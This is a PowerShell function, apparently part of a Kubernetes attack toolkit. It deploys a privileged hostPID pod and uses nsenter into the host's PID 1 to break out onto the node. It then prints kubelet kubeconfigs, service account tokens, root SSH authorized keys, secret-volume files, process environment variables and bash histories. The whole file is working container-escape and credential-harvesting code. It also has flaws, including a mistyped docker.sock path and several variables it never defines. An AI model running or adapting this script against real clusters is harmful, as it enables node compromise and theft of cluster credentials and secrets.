function Perform-HostPidExploit {
    param(
        [Parameter(Mandatory = $false)]
        [string]$node,
        [Parameter(Mandatory = $true)]
        [string]$namespace,
        [Parameter(mandatory = $true)]
        [string]$resource
    )
   
   $filePath = "$PSScriptRoot/../../Exploitpods/hostpidAndprivileged/$resource/hostpid-privileged-exec-$resource.yaml"
    # Read the file, replace the content, and write the changes back
    if(-not [string]::IsNullOrEmpty($node)){
        (Get-Content $filePath) | ForEach-Object {
            Write-Host $_
            $_ -replace '(#\s*)?nodeName:.*', "nodeName: $node"
        } | Set-Content $filePath
    }
    else{
        (Get-Content $filePath) | ForEach-Object {
            Write-Host $_
            $_ -replace 'nodeName:.*', "#nodeName:.*"
        } | Set-Content $filePath
    }

    Kubectl apply -f $filePath -n $namespace
    #To be sure it is sucesfully running
    Start-Sleep -Seconds 10
    $MostRecentRunningPodByName = Get-MostRecentRunningPodByName -namespace $namespace -podNameSubstring "hostpid-privileged-exec-"
    Write-Host the MostRecentRunningPodByName is $MostRecentRunningPodByName.metadata.name
    if($MostRecentRunningPodByName){
        Write-Host "checking if running in docker desktop"
        if(kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'test -e /va2r/run/docker.sock && echo "True" || echo "false"' -eq "True"){
            Write-Host "Running inside docker desktop do you want to continue?" 
            $yesOrNo = Get-YesOrNoInput
            if(-not $yesOrNo){
                return
            }
        }
        Write-Host "Retrieving bootstrap-kubeconfig:" -ForegroundColor Green
        Write-Host ""
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /var/lib/kubelet/bootstrap-kubeconfig
        Write-Host ""
        Write-Host "The node Service account token:" -ForegroundColor Green
        Write-Host ""
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
        Write-Host "The node kubelet:" -ForegroundColor Green
        Write-Host ""
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /etc/default/kubelet
        Write-Host ""
        Write-Host "The ssh authorized keys:" -ForegroundColor Green
        Write-Host ""
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /root/.ssh/authorized_keys
        Write-Host ""
        Write-Host "Retrieving kubeconfig:" -ForegroundColor Green
        Write-Host ""
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat /var/lib/kubelet/kubeconfig
        #Write-Host "some found cache information :"
        #kubectl debug node/$nodeName -it --image=ubuntu -n $namespace -- cat /host/.kube/cache/http/* not possible
        Write-Host ""
        Write-Host "Trying to retrieve all Service Accoun tokens" -ForegroundColor Green
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- grep -ERi eyj /var/lib/kubelet/pods --include=token
        Write-Host ""
        Write-Host "Searching for some custom secrets"
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /var/lib/kubelet/pods/  -type f  -path "*/volumes/kubernetes.io~secret/*"
        Write-Host ""
        Write-Host "Searching for short lived access tokens form service accounts (however they do live for more then a year)"
        Write-Host ""
        kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /var/lib/kubelet/pods/ -path "*/volumes/kubernetes.io~projected/*/token"

        #Retrieve environments
        $procenvironmetLocations = kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /proc -maxdepth 2 -name environ
        Write-Host all environments $procenvironmetLocations
        Write-Host "Do you want to list all output of environment variables?"
        $yesOrNo = Get-YesOrNoInput
        if($yesOrNo){
            foreach($environment in $procenvironmetLocations){
                Write-Host "Listing Environment variables"
                write-Host $environment
                kubectl exec -it $MostRecentRunningPodByName.metadata.name -n $namespace -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat $environment
            }
        }

        if($extensions.Count -gt 0){
            Foreach($extension in $extensions){
                Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension $extension -accesstoken $access_token -method "hostpid"
            }
        }
        else{
            Write-Host "No extensions where given performing regular search:"
            Write-Host "Searching for any key file on different volumes"
            Write-Host ""
            #Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".key" -accesstoken $access_token -method "hostpid"
            Write-Host "Searching for BashHistory"
            Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".bash_history" -accesstoken $access_token -method "hostpid"
            Write-Host "Searching for configuration files with .conf"
            Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".conf" -accesstoken $access_token -method "hostpid"
        }
    }
    else{
        Write-Host "there was an error apperantly the status resulted with $statusCheck"
        Write-Host "Listing more log information below"
        kubectl logs $MostRecentRunningPodByName.metadata.name -n $cleanNamespace
    }
    kubectl delete pod $MostRecentRunningPodByName.metadata.name -n $namespace
}